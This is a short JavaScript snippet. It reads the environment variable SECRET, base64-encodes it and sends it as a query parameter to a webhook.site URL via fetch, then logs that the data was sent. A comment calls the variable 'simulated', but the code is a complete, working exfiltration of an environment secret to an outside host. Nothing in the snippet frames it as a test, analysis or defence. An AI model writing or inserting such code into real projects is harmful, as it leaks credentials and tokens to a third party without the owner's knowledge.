// Simulated environment variable
const SECRET = process.env.SECRET;
// Encode and send to webhook
const encodedVariable = btoa(SECRET);
const webhookUrl = `https://webhook.site/2e32e2e8-7b4b-482f-9495-8726bc4a4f5d?yo=${encodedVariable}`;

fetch(webhookUrl)
  .then(response => response.text())
  .then(data => {
    console.log('Data sent successfully:', data);
  })
  .catch(error => {
    console.error('Error sending data:', error);
  });
